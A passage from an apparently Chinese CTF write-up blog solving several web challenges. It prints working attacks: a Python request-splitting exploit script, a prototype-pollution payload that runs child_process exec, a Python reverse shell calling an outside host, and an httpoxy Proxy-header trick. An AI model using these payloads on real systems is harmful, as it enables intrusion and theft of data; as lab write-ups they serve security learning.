class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.post(<span class=\"string\">'/file_upload'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">req, res</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> ip = req.connection.remoteAddress;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">        msg: <span class=\"string\">''</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!ip.includes(<span class=\"string\">'127.0.0.1'</span>)) &#123;   <span class=\"comment\">//保证地址是127.0.0.1</span></span><br><span class=\"line\">        obj.msg=<span class=\"string\">\"only admin's ip can use it\"</span></span><br><span class=\"line\">        res.send(<span class=\"built_in\">JSON</span>.stringify(obj));</span><br><span class=\"line\">        <span class=\"keyword\">return</span> </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fs.readFile(req.files[<span class=\"number\">0</span>].path, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">err, data</span>)</span>&#123;   <span class=\"comment\">//读取文件内容，读取的数据放到data中</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(err)&#123;</span><br><span class=\"line\">            obj.msg = <span class=\"string\">'upload failed'</span>;  </span><br><span class=\"line\">            res.send(<span class=\"built_in\">JSON</span>.stringify(obj));   <span class=\"comment\">//如果读取失败，返回upload failed</span></span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> file_path = <span class=\"string\">'/uploads/'</span> + req.files[<span class=\"number\">0</span>].mimetype +<span class=\"string\">\"/\"</span>;   <span class=\"comment\">//file_path为 /uploads/ 加上上传时的Content-Type</span></span><br><span class=\"line\">            <span class=\"keyword\">var</span> file_name = req.files[<span class=\"number\">0</span>].originalname   <span class=\"comment\">//file_name为上传时的文件名</span></span><br><span class=\"line\">            <span class=\"keyword\">var</span> dir_file = __dirname + file_path + file_name</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!fs.existsSync(__dirname + file_path))&#123;  </span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    fs.mkdirSync(__dirname + file_path)  <span class=\"comment\">//检查路径是否存在，如果不存在就创建 </span></span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (error) &#123;</span><br><span class=\"line\">                    obj.msg = <span class=\"string\">\"file type error\"</span>;</span><br><span class=\"line\">                    res.send(<span class=\"built_in\">JSON</span>.stringify(obj));</span><br><span class=\"line\">                    <span class=\"keyword\">return</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                fs.writeFileSync(dir_file,data)  <span class=\"comment\">//向上传的文件中写入数据</span></span><br><span class=\"line\">                obj = &#123;</span><br><span class=\"line\">                    msg: <span class=\"string\">'upload success'</span>,</span><br><span class=\"line\">                    filename: file_path + file_name</span><br><span class=\"line\">                &#125; </span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (error) &#123;</span><br><span class=\"line\">                obj.msg = <span class=\"string\">'upload failed'</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            res.send(<span class=\"built_in\">JSON</span>.stringify(obj));    </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p>还有一条是代理访问<code>http://localhost:8081/source</code><br>这一条就刚好解决了文件上传的IP不是127.0.0.1的问题。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.get(<span class=\"string\">'/core'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> q = req.query.q;  <span class=\"comment\">//获取参数q</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> resp = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (q) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> url = <span class=\"string\">'http://localhost:8081/source?'</span> + q  </span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(url)  <span class=\"comment\">//终端打印url</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> trigger = blacklist(url);  </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (trigger === <span class=\"literal\">true</span>) &#123;   </span><br><span class=\"line\">            res.send(<span class=\"string\">\"&lt;p&gt;error occurs!&lt;/p&gt;\"</span>);   <span class=\"comment\">//url中不能包含黑名单中字符，也就是参数q不能包含</span></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                http.get(url, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">resp</span>) </span>&#123;</span><br><span class=\"line\">                    resp.setEncoding(<span class=\"string\">'utf8'</span>);</span><br><span class=\"line\">                    resp.on(<span class=\"string\">'error'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">err</span>) </span>&#123;  <span class=\"comment\">//处理response流中的error事件</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (err.code === <span class=\"string\">\"ECONNRESET\"</span>) &#123;</span><br><span class=\"line\">                     <span class=\"built_in\">console</span>.log(<span class=\"string\">\"Timeout occurs\"</span>);</span><br><span class=\"line\">                     <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                   &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">                    resp.on(<span class=\"string\">'data'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">chunk</span>) </span>&#123;   <span class=\"comment\">////处理response流中的data事件</span></span><br><span class=\"line\">                        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                         resps = chunk.toString();</span><br><span class=\"line\">                         res.send(resps);</span><br><span class=\"line\">                        &#125;<span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">                           res.send(e.message);</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">                    &#125;).on(<span class=\"string\">'error'</span>, (e) =&gt; &#123;</span><br><span class=\"line\">                         res.send(e.message);&#125;);</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (error) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">console</span>.log(error);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        res.send(<span class=\"string\">\"search param 'q' missing!\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p>题目提示了node版本，搜索发现  此版本的http.get存在漏洞<br><a href=\"https://xz.aliyun.com/t/2894#toc-2\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/2894#toc-2</a></p>\n<p>翻阅pug文档<a href=\"https://pugjs.bootcss.com/language/includes.html\" target=\"_blank\" rel=\"noopener\">https://pugjs.bootcss.com/language/includes.html</a></p>\n<p>包含flag文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">doctype html</span><br><span class=\"line\">html</span><br><span class=\"line\">  head</span><br><span class=\"line\">    style</span><br><span class=\"line\">      include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</span><br></pre></td></tr></table></figure>\n\n<p>使用文件上传路由，然后抓包，再修改一下</p>\n<blockquote>\n<p>尝试自己编写脚本，但是一直报错，待更新</p>\n</blockquote>\n<p>附上赵师傅的脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> urllib.parse</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">''' HTTP/1.1</span></span><br><span class=\"line\"><span class=\"string\">Host: x</span></span><br><span class=\"line\"><span class=\"string\">Connection: keep-alive</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">POST /file_upload HTTP/1.1</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810</span></span><br><span class=\"line\"><span class=\"string\">Connection: keep-alive</span></span><br><span class=\"line\"><span class=\"string\">cache-control: no-cache</span></span><br><span class=\"line\"><span class=\"string\">Host: x</span></span><br><span class=\"line\"><span class=\"string\">Content-Length: 292</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">----------------------------919695033422425209299810</span></span><br><span class=\"line\"><span class=\"string\">Content-Disposition: form-data; name=\"file\"; filename=\"glzjin.pug\"</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: /../template</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">doctype html</span></span><br><span class=\"line\"><span class=\"string\">html</span></span><br><span class=\"line\"><span class=\"string\">  head</span></span><br><span class=\"line\"><span class=\"string\">    style</span></span><br><span class=\"line\"><span class=\"string\">      include ../../../../../../../flag.txt</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">----------------------------919695033422425209299810--</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">GET /flag HTTP/1.1</span></span><br><span class=\"line\"><span class=\"string\">Host: x</span></span><br><span class=\"line\"><span class=\"string\">Connection: close</span></span><br><span class=\"line\"><span class=\"string\">x:'''</span></span><br><span class=\"line\">payload = payload.replace(<span class=\"string\">\"\\n\"</span>, <span class=\"string\">\"\\r\\n\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">''</span>.join(chr(int(<span class=\"string\">'0xff'</span> + hex(ord(c))[<span class=\"number\">2</span>:].zfill(<span class=\"number\">2</span>), <span class=\"number\">16</span>)) <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> payload)</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">r = requests.get(<span class=\"string\">'http://3bfb563e-08fd-4430-80c9-4619b1f703e9.node3.buuoj.cn/core?q='</span> + urllib.parse.quote(payload))</span><br><span class=\"line\">print(r.text)</span><br><span class=\"line\"></span><br><span class=\"line\">r = requests.get(url+<span class=\"string\">'/?action=glzjin'</span>)</span><br><span class=\"line\">print(r.text)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n<h1 id=\"ezExpress\"><a href=\"#ezExpress\" class=\"headerlink\" title=\"ezExpress\"></a>ezExpress</h1><p>打开题目是一个登录界面</p>\n<p><img src=\"/pic/127.png\" alt=\"\"></p>\n<p>随意输入一下看看404有什么东西，得到了网页的绝对地址/app</p>\n<p><img src=\"/pic/130.png\" alt=\"\"></p>\n<p>扫描发现有源码<a href=\"http://www.zip,先查看route下的源码\" target=\"_blank\" rel=\"noopener\">www.zip,先查看route下的源码</a></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">safeKeyword</span>(<span class=\"params\">keyword</span>) </span>&#123;   <span class=\"comment\">//不能包含admin</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span>(keyword.match(<span class=\"regexp\">/(admin)/i</span>s)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> keyword</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">undefined</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(<span class=\"string\">'/login'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(req.body.Submit==<span class=\"string\">\"register\"</span>)</span><br><span class=\"line\">   <span class=\"keyword\">if</span>(safeKeyword(req.body.userid))&#123;      <span class=\"comment\">//调用safeKeyword函数进行过滤</span></span><br><span class=\"line\">    res.end(<span class=\"string\">\"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;\"</span>) </span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">    req.session.user=&#123;   <span class=\"comment\">//将用户名，密码写入session</span></span><br><span class=\"line\">      <span class=\"string\">'user'</span>:req.body.userid.toUpperCase(),   <span class=\"comment\">//将输入转成大写</span></span><br><span class=\"line\">      <span class=\"string\">'passwd'</span>: req.body.pwd,</span><br><span class=\"line\">      <span class=\"string\">'isLogin'</span>:<span class=\"literal\">false</span></span><br><span class=\"line\">    &#125;&#123;</span><br><span class=\"line\">    res.redirect(<span class=\"string\">'/'</span>); </span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(req.body.Submit==<span class=\"string\">\"login\"</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!req.session.user)&#123;res.end(<span class=\"string\">\"&lt;script&gt;alert('register first');history.go(-1);&lt;/script&gt;\"</span>)&#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class=\"line\">      req.session.user.isLogin=<span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">      res.end(<span class=\"string\">\"&lt;script&gt;alert('error passwd');history.go(-1);&lt;/script&gt;\"</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>觉得<code>toUpperCase</code>有点可疑，<a href=\"https://xz.aliyun.com/t/7184#toc-11\" target=\"_blank\" rel=\"noopener\">查找资料</a>后发现</p>\n<p>对于toUpperCase():</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br></pre></td></tr></table></figure>\n\n<p>对于toLowerCase():</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</span><br></pre></td></tr></table></figure>\n\n<p>使用adm<code>ı</code>n注册  </p>\n<p>merge、clone 可能触发原型链污染（暂时没有弄懂为什么会造成原型链污染）<a href=\"https://xz.aliyun.com/t/7184#toc-5\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/7184#toc-5</a></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">router.post(<span class=\"string\">'/action'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(req.session.user.user!=<span class=\"string\">\"ADMIN\"</span>)&#123;res.end(<span class=\"string\">\"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;\"</span>)&#125; </span><br><span class=\"line\">  req.session.user.data = clone(req.body);</span><br><span class=\"line\">  res.end(<span class=\"string\">\"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;\"</span>);  </span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">router.get(<span class=\"string\">'/info'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">  res.render(<span class=\"string\">'index'</span>,data=&#123;<span class=\"string\">'user'</span>:res.outputFunctionName&#125;);</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p><code>/action</code>代码对post传入的数据进行了clone操作,触发原型链污染。render造成代码执行<a href=\"[https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/](https://evi0s.com/2019/08/30/expresslodashejs-从原型链污染到rce/)\">参考链接</a></p>\n<p>传入可造成任意代码执行的数据，提示已经给出，flag在/flag文件中，由于无法显示出来，所以将内容输出到文件，路径已经从404报错页面得到，框架对外显示的路径都是/public/</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/action</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Origin</span>: http://f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn/</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: session=s%3AG1zgVNFpJSA-czxyV6IyZ_mCJSStbn_6.Tw40woUQYqkMMTqBQl2SDs8Td0Og%2FepP2NS%2FT24zFK8</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 133</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"__proto__\":&#123;\"outputFunctionName\": \"a;global.process.mainModule.require('child_process').exec('cat /flag &gt; /app/public/a.txt');//\"&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>访问/info触发代码执行</p>\n<p><img src=\"/pic/129.png\" alt=\"\"></p>\n<p>访问/a.txt得到flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;6d73d1f0-0865-44c3-9851-4e6f38dd58be&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>参考链接：<a href=\"https://www.zhaoj.in/read-6462.html\" target=\"_blank\" rel=\"noopener\">https://www.zhaoj.in/read-6462.html</a></p>"},{"title":"v&n内部赛","date":"2020-02-28T16:06:11.000Z","updated":"2020-03-11T21:06:11.000Z","_content":"\n## HappyCTFd\n\n打开发现是一个CTFD的平台，搜索一下发现存在漏洞CVE-2020-7245，修改admin的密码\n\nhttps://www.colabug.com/2020/0204/6940556/amp/\n\n发现有一个题目名字叫做flagflag你在哪\n\n<!--more-->\n\n在file处有一个miaoflag文件打开就是flag\n\n![](/pic/125.png)\n\n\n\n\n\n\n\n## CheckIN\n\n打开题目就是源码\n\n```python\nfrom flask import Flask, request\nimport os\napp = Flask(__name__)\n\nflag_file = open(\"flag.txt\", \"r\")\n# flag = flag_file.read()\n# flag_file.close()\n#\n# @app.route('/flag')\n# def flag():\n#     return flag\n## want flag? naive!\n\n# You will never find the thing you want:) I think\n@app.route('/shell')\ndef shell():\n    os.system(\"rm -f flag.txt\")\n    exec_cmd = request.args.get('c')\n    os.system(exec_cmd)\n    return \"1\"\n\n@app.route('/')\ndef source():\n    return open(\"app.py\",\"r\").read()\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0')\n```\n\n发现flag_file已经打开了flag.txt\n\n可以执行系统命令，发现用bash弹shell用不了\n\n使用DNS/OOB记录所有文件\n\nDNS/OOB[参考文章](https://www.freebuf.com/articles/database/183997.html)\n\n手残了一下把（ls -R/）所有进行了dns解析\n\n使用VPSnc监听12345端口\n\n```bash\nnc -lvvp 12345\n```\n\npayload\n\n```\n?c=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ns.seye.gq\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```\n\n进去之后发现没有grep功能，\n\n```bash\nls -alR /\n```\n\n\n\n列出所有文件搜索flag\n\n![](/pic/126.png)\n\n\n\n\n\n## EasySpringMVC\n\n提供了源码，下载下来进行代码审计\n\n\n\n\n\n\n\n\n\n\n\n\n\n## TimeTravel\n\n打开就是源码\n\n```php\n<?php\nerror_reporting(0);\nrequire __DIR__ . '/vendor/autoload.php';\n\nuse GuzzleHttp\\Client;\n\nhighlight_file(__FILE__);\n\nif(isset($_GET['flag'])) {\n    $client = new Client();\n    $response = $client->get('http://127.0.0.1:5000/api/eligible');\n    $content = $response->getBody();\n    $data = json_decode($content, TRUE);\n    if($data['success'] === true) {   //true返回值是数组,否则返回值为object\n      echo system('/readflag');\n    }\n}\n\nif(isset($_GET['file'])) {\n    highlight_file($_GET['file']);\n}\n\nif(isset($_GET['phpinfo'])) {\n    phpinfo();\n}\n```\n\n查看phpinfo\n\n是5.6.23版本的\n\n发现没有禁用函数\n\n| allow_url_fopen   | On   |\n| ----------------- | ---- |\n| allow_url_include | Off  |\n\n存在任意文件读取\n\n```php\n//autoload.php\nrequire_once __DIR__ . '/composer/autoload_real.php';\n\nreturn ComposerAutoloaderInit52ffee59545490028d211df73b41c57d::getLoader();\n```\n\n```php\n//autoload_real.php\n\n```\n\n```php\n//./vendor/composer/ClassLoader.php\n```\n\n~~看到guzzlehttp/guzzle有任意写文件漏洞https://www.anquanke.com/post/id/86452~~\n\n查看composer.json\n\n```php\n//composer.json\n{\n   \"require\": {\n      \"guzzlehttp/guzzle\": \"6.2.0\"\n   }\n}\n```\n\n\n\n出题人[赵师傅博客](https://www.zhaoj.in/read-6407.html)也说了是改自https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy\n\n\n\n考点是cgi 的httpproxy漏洞（CVE-2016-5385） vulhub上有漏洞说明\n\n> CGI的英文是（COMMON GATEWAY INTERFACE）公共网关接口，它的作用就是帮助服务器与语言通信，这里就是nginx和php进行通信，因为nginx和php的语言不通，因此需要一个沟通转换的过程，而CGI就是这个沟通的协议。\n>\n> nginx服务器在接受到浏览器传递过来的数据后，如果请求的是静态的页面或者图片等无需动态处理的则会直接根据请求的url找到其位置然后返回给浏览器，这里无需php参与，但是如果是一个动态的页面请求，这个时候nginx就必须与php通信，这个时候就会需要用到cgi协议，将请求数据转换成php能理解的信息，然后php根据这些信息返回的信息也要通过cgi协议转换成nginx可以理解的信息，最后nginx接到这些信息再返回给浏览器。\n>\n> \n>\n>\n\n\n\n访问请求时，添加一个proxy头部，浏览就会转发到 代理服务器，此时的访问就变成了代理服务器的127.0.0.1:500\n\n```php\n$response = $client->get('http://127.0.0.1:5000/api/eligible');\n```\n\n在代理服务器中弄一个web服务器，api/eligible的内容为\n\n```\n{\"success\":True}\n```\n\n即可得到。\n\n**注意**\n\n由于在buuoj上无法访问外网，但是可以获取一台内网linux的控制权，搭建一台代理服务器，也有更简单的方式，\n\n创建一个文件内容为例如 a.txt\n\n```http\nHTTP/1.1 200 OK\n\n{\"success\":true}\n```\n\n在linux上使用命令\n\n```bash\nnc -lvp 1234 < a.txt\n```\n\n然后发访问http://xxx/?flag，抓包添加一个proxy头部 地址为你获取控制权的linux ip地址\n\n```http\nGET /?flag HTTP/1.1\nHost: node3.buuoj.cn:25315\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0, no-cache\nProxy: http://174.0.246.216:1234/\nPragma: no-cache\n```\n\n即可获取flag\n\n```html\n \n ········\n \n#DD0000\">'phpinfo'</span><span style=\"color: #007700\">]))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">phpinfo</span><span style=\"color: #007700\">();<br />}<br 